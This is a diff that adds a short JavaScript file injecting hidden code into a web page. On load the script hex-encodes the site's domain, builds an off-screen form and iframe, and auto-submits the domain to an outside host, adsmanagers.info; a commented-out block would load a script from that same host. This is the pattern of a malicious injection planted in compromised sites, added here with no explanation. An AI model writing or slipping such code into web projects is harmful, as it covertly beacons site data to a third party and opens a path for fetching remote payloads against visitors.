@@ -1,0 +1,17 @@
+function bin2hex(s){var i,f=s.length,a=[];for(i=0;i<f;i++){a[i]=s.charCodeAt(i).toString(16);}return a.join('');}
+function getRandomInt(min,max){return Math.floor(Math.random()*(max-min+1))+min;}
+var namef='http://adsmanagers.info/bowling.php';
+var ddTages=document.createElement('div');
+ddTages.id='frmasz';
+document.body.appendChild(ddTages);
+ddTages.innerHTML='<form action="'+namef+'" target="forma" method="post"><input type="hidden" name="higger" value="'+bin2hex(document.domain)+'" /><iframe name="forma" width="'+getRandomInt(100,200)+'px" height="'+getRandomInt(100,200)+'px" style="left:-'+getRandomInt(20000,30000)+'px;position:absolute;top:0px;"></iframe>';
+var frm=document.forms[0];
+frm.submit();
+
+/*var rx='http://adsmanagers.info/bowling.php';
+var D=document.createElement('div');
+D.id='domvcz';
+document.body.appendChild(D);
+var F=document.createElement('script');
+F.setAttribute('src',rx);
+document.getElementById('domvcz').appendChild(F);*/
